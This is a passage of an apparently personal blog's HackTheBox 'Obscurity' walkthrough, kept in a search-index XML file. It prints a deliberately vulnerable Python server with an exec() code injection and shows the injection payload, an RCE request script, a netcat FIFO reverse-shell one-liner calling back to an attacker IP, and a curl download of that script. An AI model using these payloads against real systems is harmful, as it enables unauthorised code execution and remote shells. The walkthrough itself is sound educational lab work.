<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HackTheBox - Obscurity</title>
      <link href="/posts/obscurity/"/>
      <url>/posts/obscurity/</url>
      
        <content type="html"><![CDATA[<img width="587" alt="obscurity-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158295-30812b80-9887-11ea-970a-935c37992678.png"><p>Just finished the newly released Obscurity box on Hackthbox. I have to say it was a really cool box that required a lot of custom exploitation and cover various topics such as command injection, a little crypto and misconfigurations. I wouldn’t say it’s an easy one but it’s a pretty good one for developers comfortable with Python and want to level up in CTF.</p><p><strong>Tl;Dr:</strong> The user flag consisted in grabbing the source code of the server running port 80, “reverse engineer” it to find a command injection flaw in its workflow. From there you achieve remote code execution as <code>www-data</code>. As <code>www-data</code> you can access <code>Robert</code> user <code>/home/</code> directory filed with a encrypted password reminder file and a “homemade” python encryption script. Reversing this script you can recover the password used to encrypt the password reminder file. Once decrypted you use this password in the file to pivot to <code>Robert</code> user and grab the flag.<br>The root flag was accessible by abusing another homemade python script used to get a shell as root, when reverse engineer it you discover the script temporary store all users password hashes to the <code>/tmp</code> folder when running but immediately deletes them. You can write a script to grab the hashes fast enough before they get deleted, crack the hash of root and connect with the <code>root</code> account to grab the flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.168 obscurity.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sV -sT -sC obscurity.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-26 09:56 CET</span><br><span class="line">Nmap scan report <span class="keyword">for</span> obscurity.htb (10.10.10.168)</span><br><span class="line">Host is up (0.038s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   closed http</span><br><span class="line">8080/tcp open   http-proxy BadHTTPServer</span><br><span class="line">9000/tcp closed cslistener</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 16.09 seconds</span><br></pre></td></tr></table></figure><p>Bit less classic than usual, port 80 is closed, <code>nmap</code> return 9000 port which is closed (no idea what this is so we keep it in mind for later maybe).<br>The ssh port 22 is open and the 8080 one running <code>BadHTTPServer</code>… Intriguing.  </p><p>Let’s dig it on this “bad” server.<br>Opening <code>http://obsurity.htb:8080/</code> display the following website: </p><p><img src="https://user-images.githubusercontent.com/9076747/71549328-fee0f400-29bb-11ea-9df7-81ea1b4d4ae6.png" alt="obscurity"></p><p>Looking around we notice this interesting message:</p><blockquote><p>Message to server devs: the current source code for the web server is in ‘SuperSecureServer.py’ in the secret development directory.  </p></blockquote><p>Well, since we don’t have other entry point yet, let’s try to bruteforce our way to find this “secret” directory name.   </p><p>This time I decided to give <a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener"><code>ffuf</code></a> (“a fast web fuzzer written in Go”) a try. It’s usage is pretty straightforward and similar to <code>wfuzz</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ffuf -w ~/SecLists/Discovery/Web-Content/big.txt -u <span class="string">"http://obscurity.htb:8080/FUZZ/SuperSecureServer.py"</span></span><br><span class="line">        /<span class="string">'___\  /'</span>___\           /<span class="string">'___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string">       v1.0-rc1</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://obscurity.htb:8080/FUZZ/SuperSecureServer.py</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string">develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]</span></span><br><span class="line"><span class="string">:: Progress: [20470/20470] :: 222 req/sec :: Duration: [0:01:32] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure><p>Got it! The secret directory was <code>develop</code>. </p><p>Let’s open this <code>SuperSecureServer.py</code> to take a look:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> mimetypes</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">respTemplate = <span class="string">"""HTTP/1.1 &#123;statusNum&#125; &#123;statusCode&#125;</span></span><br><span class="line"><span class="string">Date: &#123;dateSent&#125;</span></span><br><span class="line"><span class="string">Server: &#123;server&#125;</span></span><br><span class="line"><span class="string">Last-Modified: &#123;modified&#125;</span></span><br><span class="line"><span class="string">Content-Length: &#123;length&#125;</span></span><br><span class="line"><span class="string">Content-Type: &#123;contentType&#125;</span></span><br><span class="line"><span class="string">Connection: &#123;connectionType&#125;</span></span><br><span class="line"><span class="string">&#123;body&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">DOC_ROOT = <span class="string">"DocRoot"</span></span><br><span class="line">CODES = &#123;<span class="string">"200"</span>: <span class="string">"OK"</span>,</span><br><span class="line">        <span class="string">"304"</span>: <span class="string">"NOT MODIFIED"</span>,</span><br><span class="line">        <span class="string">"400"</span>: <span class="string">"BAD REQUEST"</span>, <span class="string">"401"</span>: <span class="string">"UNAUTHORIZED"</span>, <span class="string">"403"</span>: <span class="string">"FORBIDDEN"</span>, <span class="string">"404"</span>: <span class="string">"NOT FOUND"</span>,</span><br><span class="line">        <span class="string">"500"</span>: <span class="string">"INTERNAL SERVER ERROR"</span>&#125;</span><br><span class="line">MIMES = &#123;<span class="string">"txt"</span>: <span class="string">"text/plain"</span>, <span class="string">"css"</span>:<span class="string">"text/css"</span>, <span class="string">"html"</span>:<span class="string">"text/html"</span>, <span class="string">"png"</span>: <span class="string">"image/png"</span>, <span class="string">"jpg"</span>:<span class="string">"image/jpg"</span>,</span><br><span class="line">        <span class="string">"ttf"</span>:<span class="string">"application/octet-stream"</span>,<span class="string">"otf"</span>:<span class="string">"application/octet-stream"</span>, <span class="string">"woff"</span>:<span class="string">"font/woff"</span>, <span class="string">"woff2"</span>: <span class="string">"font/woff2"</span>,</span><br><span class="line">        <span class="string">"js"</span>:<span class="string">"application/javascript"</span>,<span class="string">"gz"</span>:<span class="string">"application/zip"</span>, <span class="string">"py"</span>:<span class="string">"text/plain"</span>, <span class="string">"map"</span>: <span class="string">"application/octet-stream"</span>&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, **kwargs)</span>:</span></span><br><span class="line">        self.__dict__.update(kwargs)</span><br><span class="line">        now = datetime.now()</span><br><span class="line">        self.dateSent = self.modified = now.strftime(<span class="string">"%a, %d %b %Y %H:%M:%S"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stringResponse</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> respTemplate.format(**self.__dict__)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        self.good = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            request = self.parseRequest(request)</span><br><span class="line">            self.method = request[<span class="string">"method"</span>]</span><br><span class="line">            self.doc = request[<span class="string">"doc"</span>]</span><br><span class="line">            self.vers = request[<span class="string">"vers"</span>]</span><br><span class="line">            self.header = request[<span class="string">"header"</span>]</span><br><span class="line">            self.body = request[<span class="string">"body"</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            self.good = <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parseRequest</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        req = request.strip(<span class="string">"\r"</span>).split(<span class="string">"\n"</span>)</span><br><span class="line">        method,doc,vers = req[<span class="number">0</span>].split(<span class="string">" "</span>)</span><br><span class="line">        header = req[<span class="number">1</span>:<span class="number">-3</span>]</span><br><span class="line">        body = req[<span class="number">-1</span>]</span><br><span class="line">        headerDict = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> param <span class="keyword">in</span> header:</span><br><span class="line">            pos = param.find(<span class="string">": "</span>)</span><br><span class="line">            key, val = param[:pos], param[pos+<span class="number">2</span>:]</span><br><span class="line">            headerDict.update(&#123;key: val&#125;)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"method"</span>: method, <span class="string">"doc"</span>: doc, <span class="string">"vers"</span>: vers, <span class="string">"header"</span>: headerDict, <span class="string">"body"</span>: body&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.sock.bind((self.host, self.port))</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listen</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client, address = self.sock.accept()</span><br><span class="line">            client.settimeout(<span class="number">60</span>)</span><br><span class="line">            threading.Thread(target = self.listenToClient,args = (client,address)).start()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listenToClient</span><span class="params">(self, client, address)</span>:</span></span><br><span class="line">        size = <span class="number">1024</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = client.recv(size)</span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    <span class="comment"># Set the response to echo back the recieved data</span></span><br><span class="line">                    req = Request(data.decode())</span><br><span class="line">                    self.handleRequest(req, client, address)</span><br><span class="line">                    client.shutdown()</span><br><span class="line">                    client.close()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">raise</span> error(<span class="string">'Client disconnected'</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                client.close()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handleRequest</span><span class="params">(self, request, conn, address)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> request.good:</span><br><span class="line"></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># print(str(request.method) + " " + str(request.doc), end=' ')</span></span><br><span class="line">                <span class="comment"># print("from &#123;0&#125;".format(address[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(e)</span></span><br><span class="line"></span><br><span class="line">            document = self.serveDoc(request.doc, DOC_ROOT)</span><br><span class="line">            statusNum=document[<span class="string">"status"</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            document = self.serveDoc(<span class="string">"/errors/400.html"</span>, DOC_ROOT)</span><br><span class="line">            statusNum=<span class="string">"400"</span></span><br><span class="line">        body = document[<span class="string">"body"</span>]</span><br><span class="line">        statusCode=CODES[statusNum]</span><br><span class="line">        dateSent = <span class="string">""</span></span><br><span class="line">        server = <span class="string">"BadHTTPServer"</span></span><br><span class="line">        modified = <span class="string">""</span></span><br><span class="line">        length = len(body)</span><br><span class="line">        contentType = document[<span class="string">"mime"</span>] <span class="comment"># Try and identify MIME type from string</span></span><br><span class="line">        connectionType = <span class="string">"Closed"</span></span><br><span class="line">        resp = Response(</span><br><span class="line">        statusNum=statusNum, statusCode=statusCode,</span><br><span class="line">        dateSent = dateSent, server = server,</span><br><span class="line">        modified = modified, length = length,</span><br><span class="line">        contentType = contentType, connectionType = connectionType,</span><br><span class="line">        body = body</span><br><span class="line">        )</span><br><span class="line">        data = resp.stringResponse()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        conn.send(data.encode())</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span><span class="params">(self, path, docRoot)</span>:</span></span><br><span class="line">        path = urllib.parse.unquote(path)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = <span class="string">"output = 'Document: &#123;&#125;'"</span> <span class="comment"># Keep the output for later debug</span></span><br><span class="line">            exec(info.format(path)) <span class="comment"># This is how you do string formatting, right?</span></span><br><span class="line">            cwd = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">            docRoot = os.path.join(cwd, docRoot)</span><br><span class="line">            <span class="keyword">if</span> path == <span class="string">"/"</span>:</span><br><span class="line">                path = <span class="string">"/index.html"</span></span><br><span class="line">            requested = os.path.join(docRoot, path[<span class="number">1</span>:])</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(requested):</span><br><span class="line">                mime = mimetypes.guess_type(requested)</span><br><span class="line">                mime = (mime <span class="keyword">if</span> mime[<span class="number">0</span>] != <span class="literal">None</span> <span class="keyword">else</span> <span class="string">"text/html"</span>)</span><br><span class="line">                mime = MIMES[requested.split(<span class="string">"."</span>)[<span class="number">-1</span>]]</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">with</span> open(requested, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">with</span> open(requested, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        data = f.read()</span><br><span class="line">                status = <span class="string">"200"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                errorPage = os.path.join(docRoot, <span class="string">"errors"</span>, <span class="string">"404.html"</span>)</span><br><span class="line">                mime = <span class="string">"text/html"</span></span><br><span class="line">                <span class="keyword">with</span> open(errorPage, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    data = f.read().format(path)</span><br><span class="line">                status = <span class="string">"404"</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            errorPage = os.path.join(docRoot, <span class="string">"errors"</span>, <span class="string">"500.html"</span>)</span><br><span class="line">            mime = <span class="string">"text/html"</span></span><br><span class="line">            <span class="keyword">with</span> open(errorPage, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                data = f.read()</span><br><span class="line">            status = <span class="string">"500"</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">"body"</span>: data, <span class="string">"mime"</span>: mime, <span class="string">"status"</span>: status&#125;</span><br></pre></td></tr></table></figure><p>The source code is worth reading, taking a bit of time to understand give some really interesting insight on the working of this http server.</p><h3 id="Remote-Code-Execution-gt-www-data-shell"><a href="#Remote-Code-Execution-gt-www-data-shell" class="headerlink" title="Remote Code Execution -&gt; www-data shell"></a>Remote Code Execution -&gt; www-data shell</h3><p>If you are used to python development (and ctf…), a line should quickly catch your eye:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(info.format(path))</span><br></pre></td></tr></table></figure><p>As a reminded <a href="https://docs.python.org/3/library/functions.html#exec" target="_blank" rel="noopener"><code>exec()</code></a> dynamically execute Python code passed as argument.<br>Like <code>eval()</code> it’s usage is <a href="https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html" target="_blank" rel="noopener">dangerous</a> and open door to injections.  </p><p>Let’s see if we can use this flow to achieve remote code execution on the server.<br>Can we inject code in <code>info</code> variable ?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info = <span class="string">"output = 'Document: &#123;&#125;'"</span></span><br></pre></td></tr></table></figure><p>Nope… <code>path</code> then?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseRequest</span><span class="params">(self, request)</span>:</span></span><br><span class="line">    req = request.strip(<span class="string">"\r"</span>).split(<span class="string">"\n"</span>)</span><br><span class="line">    method,doc,vers = req[<span class="number">0</span>].split(<span class="string">" "</span>)</span><br><span class="line">[...]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handleRequest</span><span class="params">(self, request, conn, address)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.good:</span><br><span class="line">        document = self.serveDoc(request.doc, DOC_ROOT)</span><br><span class="line">[...]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serveDoc</span><span class="params">(self, path, docRoot)</span>:</span></span><br><span class="line">    path = urllib.parse.unquote(path)</span><br></pre></td></tr></table></figure><p>As we could have have guess <code>path</code> contains the url requested to the server and, good news for us, no sanitization is being made.  </p><p>In the same way as SQL injection, let’s try to inject Python code that will lead to remote code injection on the server.</p><p>Let’s create a simplified script to do so with information we have:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = input(<span class="string">"Command to execute: "</span>)</span><br><span class="line">info = <span class="string">"output = 'Document: &#123;&#125;'"</span></span><br><span class="line">print(info.format(path))</span><br></pre></td></tr></table></figure><p>So let’s see what would happen if we pass an <code>os</code> command as path? Let’s try with <code>os.system(&#39;sleep 5&#39;)</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python injection.py</span><br><span class="line">Command to execute: os.system(<span class="string">'sleep 5'</span>)</span><br><span class="line">output = <span class="string">'Document: os.system('</span>sleep 5<span class="string">')'</span></span><br></pre></td></tr></table></figure><p>This is not going to work, we will need to escape the python command, let’s give it another try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python injection.py</span><br><span class="line">Command to execute: <span class="string">';os.system('</span>sleep 5<span class="string">');'</span></span><br><span class="line">output = <span class="string">'Document: '</span>;os.system(<span class="string">'sleep 5'</span>);<span class="string">''</span></span><br></pre></td></tr></table></figure><p>Looks good to me and doesn’t throw error, let’s add the same <code>exec()</code> than in the original to make sure the injection will work properly against the server:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">"';os.system('sleep 5');'"</span></span><br><span class="line">info = <span class="string">"output = 'Document: &#123;&#125;'"</span></span><br><span class="line">exec(info.format(path))</span><br></pre></td></tr></table></figure><p>And let’s run it, if it hang for 5 seconds then it mean our injection was successful:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ time python injection.py</span><br><span class="line">python tmp.py  0.02s user 0.01s system 0% cpu 5.029 total</span><br></pre></td></tr></table></figure><p>It worked perfectly. Let’s now gather everything we know to achieve remote code execution on the server:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://obscurity.htb:8080/';os.system('&#123;&#125;');'"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = input(<span class="string">"Command to execute: "</span>)</span><br><span class="line">    r = requests.get(url.format(cmd))</span><br></pre></td></tr></table></figure><p>We will try to execute a reserve shell. After having no luck getting the classical <code>netcat</code> nor <code>python</code> reverse shell to work (which is strange since we know python is running on the box), I managed to get the <a href="https://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498" target="_blank" rel="noopener"><code>fifo netcat</code></a> reverse shell to work:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.sh</span><br><span class="line">rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 8585 &gt;/tmp/h</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>Then we open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And finally we send our payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python rce.py</span><br><span class="line">Command to execute: curl 10.10.10.10:8000/hg8.sh -o /tmp/hg8.sh</span><br><span class="line">Command to execute: bash /tmp/hg8.sh</span><br></pre></td></tr></table></figure><p>Aand we get the connection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.168:43378</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p><em>Note: Looking around we immediately notice that the python bin used is <code>pyhton3</code> that’s why the common <code>python</code> shell wasn’t working. As usual it’s easy to overlook simple blockers like this one…</em></p><h3 id="Pivot-www-data-gt-Robert"><a href="#Pivot-www-data-gt-Robert" class="headerlink" title="Pivot www-data -&gt; Robert"></a>Pivot www-data -&gt; Robert</h3><p>Quick recon shows that the user is <code>robert</code> and have a few interesting files we can read:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/$ ls -l /home/robert/</span><br><span class="line">ls -l /home/robert/</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH</span><br><span class="line">-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt</span><br><span class="line">-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt</span><br><span class="line">-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt</span><br><span class="line">-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py</span><br><span class="line">-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt</span><br></pre></td></tr></table></figure><p><code>passwordreminder.txt</code> sure looks interesting… Let’s check it out:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 